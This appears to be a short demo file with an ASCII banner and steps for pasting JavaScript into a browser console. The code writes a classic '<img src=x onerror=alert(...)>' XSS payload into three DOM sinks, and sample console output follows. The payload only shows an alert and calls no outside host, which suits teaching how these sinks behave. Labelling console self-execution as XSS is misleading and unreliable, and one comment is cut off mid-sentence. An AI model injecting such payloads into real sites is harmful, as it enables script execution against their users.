
-----==============================================================================--------
 _____    _                        __   __ _____ _____   _   _                    ___ _____ 
|_   _|  (_)                       \ \ / //  ___/  ___| | | | |                  |_  /  ___|
  | |_ __ _  __ _  __ _  ___ _ __   \ V / \ `--.\ `--.  | |_| |__  _ __ _   _      | \ `--. 
  | | '__| |/ _` |/ _` |/ _ \ '__|  /   \  `--. \`--. \ | __| '_ \| '__| | | |     | |`--. \
  | | |  | | (_| | (_| |  __/ |    / /^\ \/\__/ /\__/ / | |_| | | | |  | |_| | /\__/ /\__/ /
  \_/_|  |_|\__, |\__, |\___|_|    \/   \/\____/\____/   \__|_| |_|_|   \__,_| \____/\____/ 
             __/ | __/ |       [ Trigger XSS thru JS in console ]                                                             
            |___/ |___/                                                                     

  Steps to reproduce:
            Visit target page
            Open inspect (right click) / goto console tab
            Locate where you can type > prompt
            Paste in harmless example code

// Example JS Code:
(() => { 
    // 1. JSON.parse injection
    try { const payload = '{"key": "<img src=x onerror=alert(document.location)>"}'; const parsed = JSON.parse(payload); document.body.innerHTML = parsed.key; console.log("JSON.parse tested"); } catch(e) { console.log("JSON.parse failed:", e); }
    
    // 2. innerHTML injection
    try { const target = document.body; target.innerHTML = '<img src=x onerror=alert(document.location)>'; console.log("innerHTML tested"); } catch(e) { console.log("innerHTML failed:", e); }

    // 3. createContextualFragment injection
    try { const range = document.createRange(); const fragment = range.createContextualFragment('<img src=x onerror=alert(document.location)>'); document.body.appendChild(fragment); console.log("createContextualFragment tested"); } catch(e) { console.log("createContextualFragment failed:", e); }
})();

// in this example we try to inject a harmless alert into the DOM via 3 
Example output of sucessful XSS:
// You should see the alert msg 3 times in this case showing document.location

VM135:3 JSON.parse tested
06:36:51.199 VM135:6 innerHTML tested
06:36:51.199 VM135:9 createContextualFragment tested
06:36:51.227 undefined
06:36:53.662 *:1 [Violation] 'error' handler took 2135ms
06:36:54.306 *:1 [Violation] 'error' handler took 642ms
06:36:54.737 *:1 [Violation] 'error' handler took 431ms
